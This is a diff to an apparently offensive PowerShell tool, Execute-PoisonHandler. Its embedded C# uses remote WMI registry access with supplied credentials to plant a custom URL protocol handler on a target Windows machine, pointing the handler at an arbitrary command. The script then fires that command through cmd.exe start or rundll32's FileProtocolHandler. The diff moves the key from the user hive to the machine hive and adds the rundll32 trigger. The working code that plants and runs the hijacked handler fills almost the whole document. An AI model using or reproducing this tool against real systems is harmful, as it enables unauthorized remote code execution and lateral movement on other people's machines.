@@ -1,4 +1,4 @@
-$CSharp = 'using System;using System.Management;namespace RegistryEdit {public class Program {public static void Main(string[]args) {ConnectionOptions co=new ConnectionOptions();co.Username=args[0];co.Password=args[1];string target=args[2];string handler=args[3];string command=args[4];ManagementScope ms=new ManagementScope("\\\\"+target+"\\root\\default");if(!args[0].Equals("")){ms.Options=co;}ManagementClass mc=new ManagementClass(ms,new ManagementPath("StdRegProv"),null);ManagementBaseObject mbo=mc.GetMethodParameters("SetStringValue");mbo["hDefKey"]=2147483649;mbo["sSubKeyName"]="Software\\Classes\\"+handler;mbo["sValue"]="URL: "+handler;mbo["sValueName"]="URL Protocol";mc.InvokeMethod("CreateKey",mbo,null);mc.InvokeMethod("SetStringValue",mbo,null);mc.GetMethodParameters("SetStringValue");mbo["sSubKeyName"]="Software\\Classes\\"+handler+"\\shell\\open\\command";mbo["sValue"]=command;mbo["sValueName"]=null;mc.InvokeMethod("CreateKey",mbo,null);mc.InvokeMethod("SetStringValue",mbo,null);}}}';
+$CSharp = 'using System;using System.Management;namespace RegistryEdit {public class Program {public static void Main(string[]args) {ConnectionOptions co=new ConnectionOptions();co.Username=args[0];co.Password=args[1];string target=args[2];string handler=args[3];string command=args[4];ManagementScope ms=new ManagementScope("\\\\"+target+"\\root\\default");if(!args[0].Equals("")){ms.Options=co;}ManagementClass mc=new ManagementClass(ms,new ManagementPath("StdRegProv"),null);ManagementBaseObject mbo=mc.GetMethodParameters("SetStringValue");mbo["hDefKey"]=2147483650;mbo["sSubKeyName"]="Software\\Classes\\"+handler;mbo["sValue"]="URL: "+handler;mbo["sValueName"]="URL Protocol";mc.InvokeMethod("CreateKey",mbo,null);mc.InvokeMethod("SetStringValue",mbo,null);mc.GetMethodParameters("SetStringValue");mbo["sSubKeyName"]="Software\\Classes\\"+handler+"\\shell\\open\\command";mbo["sValue"]=command;mbo["sValueName"]=null;mc.InvokeMethod("CreateKey",mbo,null);mc.InvokeMethod("SetStringValue",mbo,null);}}}';
 
 Add-Type -ReferencedAssemblies "System.Management.dll" -TypeDefinition $CSharp -Language CSharp;
 
@@ -13,16 +13,23 @@ function Execute-PoisonHandler {
 		[Parameter(Mandatory=$False)]
 		[string]$Password = "",
 		[Parameter(Mandatory=$False)]
-		[string]$Handler = "ms-browser"
+		[string]$Handler = "ms-browser",
+		[Parameter(Mandatory=$False)]
+		[string]$UseRunDLL32 = $False
+
 	)
 	
 	BEGIN {
-		Write-Host "[+] Executing payload on $($ComputerName)"
+		Write-Output "[+] Executing payload on $($ComputerName)"
 		if($Username -ne "") {
 			$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
 			$Creds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username, $SecurePassword
 		}
-		$Command = "explorer.exe $($Handler)://"
+		
+		$Command = "cmd.exe /c start $($Handler)://"
+		if($UseRunDLL32) {
+			$Command = "rundll32 url.dll,FileProtocolHandler $($Handler)://"
+		}
 	}
 	
 	PROCESS {
@@ -40,6 +47,6 @@ function Execute-PoisonHandler {
 	}
 	
 	END {
-		Write-Host "[+] Process completed..."
+		Write-Output "[+] Process completed..."
 	}
 }
